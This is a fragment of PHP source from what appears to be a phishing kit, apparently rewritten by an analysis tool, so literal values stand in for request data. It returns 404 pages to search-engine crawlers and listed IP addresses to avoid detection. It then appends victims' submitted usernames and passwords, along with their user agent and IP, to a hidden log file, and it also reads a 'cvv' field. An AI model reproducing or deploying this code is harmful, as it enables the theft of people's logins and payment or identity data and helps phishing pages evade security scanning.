...
if (in_array('123.123.123.123', $bannedIP)) {
    ...
    foreach ($bannedIP as $ip) {
        if (preg_match('/' . $ip . '/', '123.123.123.123')) {
            header('HTTP/1.0 404 Not Found');
            'exit';
        }
    }
...
if (!empty('Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0')) {
    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
    foreach ($userAgents as $agent) {
        if (strpos('Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0', $agent) !== false) {
            header('HTTP/1.0 404 Not Found');
            'exit';
        }
    }
...
function is_bot()
{
    ...
    foreach ($spiders as $spider) {
        if (stripos('Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0', $spider) !== false) {
            return true;
        }
    }
    return false;
...
foreach ($Botname as $word2) {
    if (stripos('Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0', $word2)) {
        'exit';
    }
}
foreach ($ips as $ip) {
...
$cvv = $_ENV['_POST_sin'];
if (!empty('123.123.123.123')) {
    $ip = '123.123.123.123';
} elseif (!empty('123.123.123.123')) {
    $ip = '123.123.123.123';
} else {
    $ip = '123.123.123.123';
}
file_put_contents('F1ls.txt', "../../niama.txt", 8);
file_put_contents('F1ls.txt', '
', 8);
$fp = fopen("../../niama.txt", "a") or 'exit';
fputs($fp, "\n");
fputs($fp, "--------------td lolo----------------------\n");
fputs($fp, "|USER : " . $_ENV['_POST_username'] . "\n");
fputs($fp, "|PASS : " . $_ENV['_POST_password'] . "\n");
fputs($fp, "=--------------# end #--------------------\n");
fputs($fp, "UA  : " . 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0' . "\n");
fputs($fp, "IP  : " . '123.123.123.123' . "\n");
fclose($fp);
